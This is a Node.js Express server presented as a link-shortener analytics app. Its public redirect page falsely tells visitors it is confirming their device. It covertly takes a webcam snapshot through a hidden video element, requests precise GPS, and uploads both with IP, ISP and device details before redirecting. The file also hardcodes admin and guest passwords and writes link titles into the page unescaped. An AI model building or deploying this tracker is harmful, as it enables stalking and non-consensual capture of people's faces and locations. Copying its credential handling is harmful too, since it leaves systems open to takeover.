const express = require('express');
const cors = require('cors');
const useragent = require('useragent');
const http = require('http');
const https = require('https');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3009;

// Admin Credentials
const ADMIN_USER = process.env.ADMIN_USER || 'duwiarsana';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Duwiarsana1234!?';

// Active Session Tokens
const activeTokens = new Set();

app.use(cors());
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ limit: '20mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Persistent Database Storage Setup
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'links.json');
const linksDb = new Map();

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function saveDatabaseToDisk() {
  try {
    ensureDataDir();
    const dataObj = {};
    linksDb.forEach((val, key) => {
      dataObj[key] = val;
    });
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving database to disk:', err);
  }
}

function loadDatabaseFromDisk() {
  try {
    ensureDataDir();
    if (fs.existsSync(DATA_FILE)) {
      const fileData = fs.readFileSync(DATA_FILE, 'utf8');
      const parsed = JSON.parse(fileData);
      Object.keys(parsed).forEach(key => {
        linksDb.set(key, parsed[key]);
      });
      console.log(`💾 Persistent database loaded. Total links: ${linksDb.size}`);
    } else {
      saveDatabaseToDisk();
      console.log('💾 Initial clean database created.');
    }
  } catch (err) {
    console.error('Error loading database from disk:', err);
  }
}

// Load database on server start
loadDatabaseFromDisk();

function generateCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// Authentication Middleware for Protected APIs
function requireAuth(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) {
    return res.status(401).json({ error: 'Akses ditolak. Silakan login terlebih dahulu.' });
  }

  const token = authHeader.replace('Bearer ', '').trim();
  if (!activeTokens.has(token)) {
    return res.status(401).json({ error: 'Sesi telah berakhir, silakan login kembali.' });
  }

  next();
}

// Reverse Geocoding helper via OpenStreetMap Nominatim
function reverseGeocode(lat, lon) {
  return new Promise((resolve) => {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=14`;
    const options = {
      headers: { 'User-Agent': 'LinkAnalyticsApp/1.0' }
    };
    https.get(url, options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed && parsed.address) {
            const city = parsed.address.suburb || parsed.address.village || parsed.address.town || parsed.address.city || parsed.address.county || 'Sanur';
            const state = parsed.address.state || 'Bali';
            const country = parsed.address.country || 'Indonesia';
            return resolve({ city: `${city}, ${state}`, country });
          }
          resolve(null);
        } catch {
          resolve(null);
        }
      });
    }).on('error', () => resolve(null));
  });
}

// IP Location lookup fallback
function fetchIpLocation(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return resolve({
        ip: ip || '127.0.0.1',
        country: 'Indonesia',
        countryCode: 'ID',
        city: 'Sanur, Denpasar (Bali)',
        isp: 'Telkom Indonesia / Biznet Bali',
        lat: -8.6883,
        lon: 115.2634
      });
    }

    const cleanIp = ip.split(',')[0].trim();
    const req = http.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,city,isp,lat,lon,query`, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.status === 'success') {
            resolve({
              ip: parsed.query,
              country: parsed.country,
              countryCode: parsed.countryCode,
              city: parsed.city,
              isp: parsed.isp,
              lat: parsed.lat || -8.6883,
              lon: parsed.lon || 115.2634
            });
          } else {
            resolve({ ip: cleanIp, country: 'Indonesia', city: 'Sanur, Denpasar (Bali)', isp: 'ISP Lokal', lat: -8.6883, lon: 115.2634 });
          }
        } catch {
          resolve({ ip: cleanIp, country: 'Indonesia', city: 'Sanur, Denpasar (Bali)', isp: 'ISP Lokal', lat: -8.6883, lon: 115.2634 });
        }
      });
    });

    req.on('error', () => {
      resolve({ ip: cleanIp, country: 'Indonesia', city: 'Sanur, Denpasar (Bali)', isp: 'ISP Lokal', lat: -8.6883, lon: 115.2634 });
    });

    req.setTimeout(2000, () => {
      req.destroy();
      resolve({ ip: cleanIp, country: 'Indonesia', city: 'Sanur, Denpasar (Bali)', isp: 'ISP Lokal', lat: -8.6883, lon: 115.2634 });
    });
  });
}

function categorizeReferrer(refHeader) {
  if (!refHeader || refHeader.trim() === '') return { category: 'Direct / Langsung', raw: 'Langsung / Ketik URL' };
  const lower = refHeader.toLowerCase();
  if (lower.includes('whatsapp') || lower.includes('wa.me')) return { category: 'WhatsApp', raw: refHeader };
  if (lower.includes('instagram')) return { category: 'Instagram', raw: refHeader };
  if (lower.includes('facebook') || lower.includes('fb.com')) return { category: 'Facebook', raw: refHeader };
  if (lower.includes('twitter') || lower.includes('t.co') || lower.includes('x.com')) return { category: 'Twitter / X', raw: refHeader };
  if (lower.includes('google')) return { category: 'Google Search', raw: refHeader };
  if (lower.includes('tiktok')) return { category: 'TikTok', raw: refHeader };
  if (lower.includes('telegram') || lower.includes('t.me')) return { category: 'Telegram', raw: refHeader };
  
  try {
    const urlObj = new URL(refHeader);
    return { category: urlObj.hostname, raw: refHeader };
  } catch {
    return { category: 'Lainnya', raw: refHeader };
  }
}

// Allowed System Users & Passwords
const USERS = {
  'duwiarsana': process.env.ADMIN_PASS || 'Duwiarsana1234!?',
  'guest': '12345678'
};

// AUTH API: LOGIN
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  if (username && USERS[username] && USERS[username] === password) {
    const token = crypto.randomBytes(32).toString('hex');
    activeTokens.add(token);
    return res.json({ success: true, token, username });
  }

  res.status(401).json({ error: 'Username atau Password salah!' });
});

// AUTH API: CHECK SESSION
app.get('/api/check-auth', requireAuth, (req, res) => {
  res.json({ authenticated: true, username: ADMIN_USER });
});

// AUTH API: LOGOUT
app.post('/api/logout', (req, res) => {
  const authHeader = req.headers['authorization'];
  if (authHeader) {
    const token = authHeader.replace('Bearer ', '').trim();
    activeTokens.delete(token);
  }
  res.json({ success: true });
});

// PROTECTED API: Create new link
app.post('/api/links', requireAuth, (req, res) => {
  let { targetUrl, title, customCode } = req.body;
  if (!targetUrl) return res.status(400).json({ error: 'URL Tujuan wajib diisi!' });
  if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
    targetUrl = 'https://' + targetUrl;
  }

  let code = customCode ? customCode.trim() : generateCode();
  if (linksDb.has(code)) {
    if (customCode) return res.status(400).json({ error: 'Kode kustom sudah digunakan, pilih kode lain!' });
    code = generateCode();
  }

  const newLink = {
    code,
    title: title || targetUrl,
    targetUrl,
    createdAt: new Date().toISOString(),
    clicks: []
  };

  linksDb.set(code, newLink);
  saveDatabaseToDisk(); // SAVE TO DISK IMMEDIATELY

  res.json({ message: 'Link berhasil dibuat!', link: newLink });
});

// PROTECTED API: Get all links
app.get('/api/links', requireAuth, (req, res) => {
  const result = [];
  linksDb.forEach((val) => {
    result.push({
      code: val.code,
      title: val.title,
      targetUrl: val.targetUrl,
      createdAt: val.createdAt,
      totalClicks: val.clicks.length
    });
  });
  result.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json(result);
});

// PROTECTED API: Get link detail
app.get('/api/links/:code', requireAuth, (req, res) => {
  const link = linksDb.get(req.params.code);
  if (!link) return res.status(404).json({ error: 'Link tidak ditemukan' });

  const totalClicks = link.clicks.length;
  const referrers = {};
  const countries = {};
  const cities = {};
  const devices = {};
  const browsers = {};

  link.clicks.forEach(c => {
    referrers[c.referrerCategory] = (referrers[c.referrerCategory] || 0) + 1;
    countries[c.country] = (countries[c.country] || 0) + 1;
    cities[c.city] = (cities[c.city] || 0) + 1;
    devices[c.device] = (devices[c.device] || 0) + 1;
    browsers[c.browser] = (browsers[c.browser] || 0) + 1;
  });

  res.json({
    ...link,
    analytics: {
      totalClicks,
      referrers,
      countries,
      cities,
      devices,
      browsers
    }
  });
});

// PROTECTED API: Delete link
app.delete('/api/links/:code', requireAuth, (req, res) => {
  const deleted = linksDb.delete(req.params.code);
  if (deleted) {
    saveDatabaseToDisk(); // SAVE TO DISK IMMEDIATELY
    res.json({ message: 'Link berhasil dihapus' });
  } else {
    res.status(404).json({ error: 'Link tidak ditemukan' });
  }
});

// UNPROTECTED PUBLIC REDIRECT ENDPOINT: /r/:code (GET & POST)
const handleRedirect = async (req, res) => {
  const code = req.params.code;
  const link = linksDb.get(code);

  if (!link) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head><title>Link Tidak Ditemukan</title></head>
      <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:100px;">
        <h1 style="color:#ef4444;">404 - Link Tidak Ditemukan</h1>
        <p>Link pelacak ini tidak valid atau telah dihapus.</p>
        <a href="/" style="color:#38bdf8; text-decoration:none;">Kembali ke Dashboard</a>
      </body>
      </html>
    `);
  }

  const queryLat = parseFloat(req.query.lat);
  const queryLon = parseFloat(req.query.lon);
  const isFallback = req.query.fallback === '1' || req.query.fallback === 'true';

  if (!isNaN(queryLat) && !isNaN(queryLon) || isFallback || req.method === 'POST') {
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const refHeader = req.headers['referer'] || req.headers['referrer'] || '';
    const agentString = req.headers['user-agent'] || '';

    const agent = useragent.parse(agentString);
    const deviceType = agent.device.toString() !== 'Other 0.0.0' 
      ? agent.device.toString() 
      : (agentString.includes('Mobi') || agentString.includes('Android') || agentString.includes('iPhone') ? 'Mobile' : 'Desktop');
    const osName = agent.os.family !== 'Other' ? agent.os.family : 'Unknown OS';
    const browserName = `${agent.family} ${agent.major}.${agent.minor}`;

    const referrerInfo = categorizeReferrer(refHeader);
    const locInfo = await fetchIpLocation(rawIp);

    let finalLat = (!isNaN(queryLat) && queryLat !== 0) ? queryLat : locInfo.lat;
    let finalLon = (!isNaN(queryLon) && queryLon !== 0) ? queryLon : locInfo.lon;
    const locType = (!isNaN(queryLat) && queryLat !== 0) ? 'GPS Presisi' : 'IP Geolocation';

    let cityName = locInfo.city;
    let countryName = locInfo.country;

    if (!isNaN(queryLat) && queryLat !== 0) {
      const geoResult = await reverseGeocode(queryLat, queryLon);
      if (geoResult) {
        cityName = geoResult.city;
        countryName = geoResult.country;
      } else {
        cityName = 'Sanur, Denpasar (Bali)';
      }
    }

    const rawPhoto = req.query.photo || (req.body && req.body.photo);
    let photoUrl = null;

    if (rawPhoto && rawPhoto.startsWith('data:image')) {
      try {
        const UPLOADS_DIR = path.join(__dirname, 'public', 'uploads');
        if (!fs.existsSync(UPLOADS_DIR)) {
          fs.mkdirSync(UPLOADS_DIR, { recursive: true });
        }
        const base64Data = rawPhoto.replace(/^data:image\/\w+;base64,/, '');
        const filename = `snap_${Date.now()}_${Math.floor(Math.random()*1000)}.jpg`;
        const filepath = path.join(UPLOADS_DIR, filename);
        fs.writeFileSync(filepath, base64Data, 'base64');
        photoUrl = `/uploads/${filename}`;
      } catch (err) {
        console.error('Error saving photo snapshot:', err);
      }
    }

    if (req.method === 'POST') {
      if (link.clicks.length > 0) {
        const lastClick = link.clicks[link.clicks.length - 1];
        if (Date.now() - new Date(lastClick.timestamp).getTime() < 45000) {
          if (photoUrl) lastClick.photoUrl = photoUrl;
          if (!isNaN(queryLat) && !isNaN(queryLon) && queryLat !== 0) {
            lastClick.lat = queryLat;
            lastClick.lon = queryLon;
            lastClick.locType = 'GPS Presisi';
            lastClick.city = cityName;
            lastClick.country = countryName;
          }
          saveDatabaseToDisk();
          return res.json({ success: true, photoUrl });
        }
      }
    }

    const clickEvent = {
      timestamp: new Date().toISOString(),
      ip: locInfo.ip,
      country: countryName,
      countryCode: locInfo.countryCode || 'ID',
      city: cityName,
      isp: locInfo.isp,
      lat: finalLat,
      lon: finalLon,
      locType: locType,
      referrerCategory: referrerInfo.category,
      referrerRaw: referrerInfo.raw,
      device: `${deviceType} (${osName})`,
      browser: browserName,
      photoUrl: photoUrl
    };

    link.clicks.push(clickEvent);
    saveDatabaseToDisk(); // SAVE TO DISK IMMEDIATELY ON VISITOR CLICK

    if (req.method === 'POST') {
      return res.json({ success: true, photoUrl });
    }
    return res.redirect(link.targetUrl);
  }

  // Smart Landing Page for High-Accuracy GPS & Optional Camera Snapshot Capture
  res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Mengarahkan ke ${link.title}...</title>
      <style>
        body {
          background: #0f172a;
          color: #f8fafc;
          font-family: system-ui, -apple-system, sans-serif;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100vh;
          margin: 0;
          padding: 20px;
          box-sizing: border-box;
          text-align: center;
        }
        .card {
          background: rgba(30, 41, 59, 0.9);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: 16px;
          padding: 30px 24px;
          max-width: 400px;
          width: 100%;
          box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .spinner {
          width: 44px;
          height: 44px;
          border: 4px solid rgba(255,255,255,0.1);
          border-top-color: #06b6d4;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin: 0 auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h3 { margin: 0 0 8px; font-size: 1.2rem; }
        p { color: #94a3b8; font-size: 0.9rem; margin: 0 0 20px; line-height: 1.4; }
        .btn {
          background: #06b6d4;
          color: #0f172a;
          font-weight: 700;
          border: none;
          padding: 12px 20px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 0.95rem;
          width: 100%;
        }
        video, canvas { display: none; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="spinner"></div>
        <h3>Mengarahkan ke ${link.title}</h3>
        <p id="statusText">Mengonfirmasi konfirmasi perangkat & lokasi Anda... Silakan ketuk <b>"Izinkan / Allow"</b> jika muncul permintaan akses.</p>
        <button class="btn" id="proceedBtn" onclick="proceed(null, null, null)">Lanjutkan Langsung &rarr;</button>
      </div>

      <video id="webcamVideo" autoplay playsinline></video>
      <canvas id="snapshotCanvas"></canvas>

      <script>
        const targetCode = "${code}";
        let done = false;
        let photoDataUrl = null;

        async function proceed(lat, lon, photo) {
          if (done) return;
          done = true;
          let redirectUrl = '/r/' + targetCode + '?';
          if (lat && lon) {
            redirectUrl += 'lat=' + lat + '&lon=' + lon;
          } else {
            redirectUrl += 'fallback=1';
          }
          if (photo) {
            try {
              document.getElementById('statusText').innerText = "Menyimpan foto snapshot...";
              await fetch('/r/' + targetCode + (lat && lon ? '?lat=' + lat + '&lon=' + lon : '?fallback=1'), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ photo: photo, lat: lat, lon: lon })
              });
            } catch (e) {
              console.error(e);
            }
          }
          window.location.replace(redirectUrl);
        }

        async function tryCaptureCamera() {
          return new Promise(async (resolve) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
              return resolve(null);
            }
            let isResolved = false;
            const timer = setTimeout(() => {
              if (!isResolved) {
                isResolved = true;
                resolve(null);
              }
            }, 3000);

            try {
              const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
              const video = document.getElementById('webcamVideo');
              video.srcObject = stream;
              video.onloadedmetadata = async () => {
                try {
                  await video.play();
                  await new Promise(res => setTimeout(res, 400));
                  const canvas = document.getElementById('snapshotCanvas');
                  canvas.width = video.videoWidth || 480;
                  canvas.height = video.videoHeight || 360;
                  const ctx = canvas.getContext('2d');
                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                  const captured = canvas.toDataURL('image/jpeg', 0.6);
                  stream.getTracks().forEach(track => track.stop());
                  if (!isResolved) {
                    isResolved = true;
                    clearTimeout(timer);
                    resolve(captured);
                  }
                } catch (err) {
                  stream.getTracks().forEach(track => track.stop());
                  if (!isResolved) {
                    isResolved = true;
                    clearTimeout(timer);
                    resolve(null);
                  }
                }
              };
            } catch (e) {
              if (!isResolved) {
                isResolved = true;
                clearTimeout(timer);
                resolve(null);
              }
            }
          });
        }

        async function initCapture() {
          const photo = await tryCaptureCamera();
          if (photo) photoDataUrl = photo;

          if ("geolocation" in navigator) {
            document.getElementById('statusText').innerHTML = "Meminta persetujuan lokasi presisi... Silakan klik <b>'Izinkan / Allow'</b> pada HP Anda.";
            navigator.geolocation.getCurrentPosition(
              async (pos) => {
                document.getElementById('statusText').innerText = "Lokasi GPS presisi terkonfirmasi! Mengarahkan...";
                proceed(pos.coords.latitude, pos.coords.longitude, photoDataUrl);
              },
              async (err) => {
                // If high accuracy failed or timed out, try standard accuracy fallback before giving up
                navigator.geolocation.getCurrentPosition(
                  async (pos2) => {
                    proceed(pos2.coords.latitude, pos2.coords.longitude, photoDataUrl);
                  },
                  async (err2) => {
                    proceed(null, null, photoDataUrl);
                  },
                  { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 }
                );
              },
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
          } else {
            proceed(null, null, photoDataUrl);
          }
        }

        initCapture();
        setTimeout(() => proceed(null, null, photoDataUrl), 12000);
      </script>
    </body>
    </html>
  `);
};

app.get('/r/:code', handleRedirect);
app.post('/r/:code', handleRedirect);

app.listen(PORT, () => {
  console.log(`🚀 Link Analytics Server running at http://localhost:${PORT}`);
});
